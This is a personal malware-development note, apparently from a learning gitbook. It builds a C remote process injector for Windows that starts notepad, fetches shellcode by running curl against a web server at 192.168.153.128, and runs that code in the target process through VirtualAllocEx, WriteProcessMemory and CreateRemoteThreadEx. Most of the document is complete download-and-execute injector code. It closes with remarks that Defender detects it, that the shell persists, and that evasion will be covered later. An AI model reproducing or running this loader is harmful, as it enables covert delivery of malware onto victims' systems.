reference: [crow's gitbook](https://crows-nest.gitbook.io/crows-nest/malware-development/process-injection/shellcode-injection)

# The words bit
Instead of basically copying crow's blog I'm going to add a few things.
1. Automate the whole "find notepad.exe PID and then start the program" thing.
2. Load the shellcode from a web server.

# Remote Process Injection
I think remote is the write word.
```c
#include <Windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

unsigned char whatsshellcode[] =
<shellcode>;

int main(int argc, char* argv[]) {

	if (argc < 2) {

		printf("%s usage: program.exe <PID>", e);
		return EXIT_FAILURE;
	}
	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld)\n", i, PID);

	/* open a handle to the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process!\n--0x%p\n", k, hProcess);


	/* allocate bytes to process memory */
	rBuffer = VirtualAllocEx(hProcess,NULL,sizeof(whatsshellcode),(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(whatsshellcode));

	WriteProcessMemory(hProcess, rBuffer, whatsshellcode, sizeof(whatsshellcode), NULL);
	printf("%s wrote %zu-bytes to process in memory.\n", k, sizeof(whatsshellcode));

	/* create thread to run the payload */
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld)\n--0x%p\n", k, TID, hThread);
	
	printf("%s waiting for thread to finish\n", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing\n",k);

	printf("%s cleaning up\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finished!", k);

	return EXIT_SUCCESS;
}
```

# Changes
## Automation
This will be super easy as I can just add the code from [Into to MalDev](./Intro%20to%20MalDev) where I made mspaint open.
```c
STARTUPINFOW si;
PROCESS_INFORMATION pi;

if (!CreateProcessW(L"C:\\WINDOWS\\system32\\notepad.exe",NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi)){
	printf("(-) failed to create process, error: %ld", GetLastError());
	return EXIT_FAILURE;
}
printf("(+) process started! pid: %ld", pi.dwProcessId);
return EXIT_SUCCESS;
```

Then just assign PID to be `pi.dwProcessId`

## Load from webserver

This can be done so many different ways, the way I'm going to do it is from this video form [Lsecqt](https://www.youtube.com/watch?v=qq-S2syksL0) (The c stager bit.) I had to modify it slightly as I was getting build errors.
```c
#include <stdio.h>
#include <windows.h>

int main() {
	FILE* fpipe;
	const char* command = "curl http://192.168.153.128/code.bin";
	char c = 0;
	unsigned char code[460];
	int counter = 0;
	if (0 == (fpipe = (FILE*)_popen(command, "r"))) {
		return EXIT_FAILURE;
	}
	while(fread(&c, sizeof(c), 1, fpipe)) {
		code[counter] = c;
		counter += 1;
	}
	_pclose(fpipe);

	void* exec = VirtualAlloc(0, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, code, sizeof(code));
	((void(*)())exec)();

	WaitForSingleObject(exec, INFINITE);

	return EXIT_SUCCESS;
}
```

So lets add this to the current Injector.

I'm going to call this right at the very start as there is no point opening a process if the server cant be reached. This is sorta bad as it adds a larger window for a race condition with the AV (I think thats how it could work) but AV evasion will be covered later.

Going to tidy the code up a tiny bit and then slap it in. Giving the end result of:
```c
#include <Windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;
PROCESS_INFORMATION pi;
STARTUPINFOW si;

int main(int argc, char* argv[]) {

	if (argc < 2) {
		/* Create new Process */
		printf("No PID supplied going to create notepad process.\n", i);

		if (!CreateProcessW(L"C:\\Windows\\system32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
			printf("%s failed to create process, error: %ld", e, GetLastError());
			return EXIT_FAILURE;
		}
		PID = pi.dwProcessId;
		printf("%s process started! pid: %ld", k, PID);
	}
	else {
		PID = atoi(argv[1]);
	}
	printf("%s trying to open a handle to process (%ld)\n", i, PID);

	/* downloading shellcode. */
	printf("%s downloading the shellcode\n", i);

	FILE* fpipe;
	const char* command = "curl http://192.168.153.128/code.bin";
	char c = 0;
	unsigned char shellcode[460];
	int counter = 0;

	fpipe = (FILE*)_popen(command, "r");
	if (fpipe == NULL) {
		printf("%s Could not download the shellcode. Is the server up? error: %ld", e, GetLastError());
		return EXIT_FAILURE;
	}

	while (fread(&c, sizeof(c), 1, fpipe)) {
		shellcode[counter] = c;
		counter += 1;
	}
	_pclose(fpipe);

	printf("%s Shellcode downloaded.\n", i);

	/* open a handle to the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the process!\n--0x%p\n", k, hProcess);


	/* allocate bytes to process memory */
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(shellcode));

	WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL);
	printf("%s wrote %zu-bytes to process in memory.\n", k, sizeof(shellcode));

	/* create thread to run the payload */
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);

	if (hThread == NULL) {
		printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld)\n--0x%p\n", k, TID, hThread);

	printf("%s waiting for thread to finish\n", i);
	WaitForSingleObject(hThread, INFINITE);
	printf("%s thread finished executing\n", k);

	printf("%s cleaning up\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finished!", k);

	return EXIT_SUCCESS;
}
```

Does it get past defender.

no not at all. The second it reaches back it dies. :(

# Detection
If you kill the notepad process or CRTL+C the script the shell still works, which is weird. Looking at what happens in task manager there is a single process called cmd.exe which is PID of the shell being run.

If you were to migrate or just inject into a different process it would be slightly harder to detect it, but then again defender picks up on this in a heart beat soo.


FIN.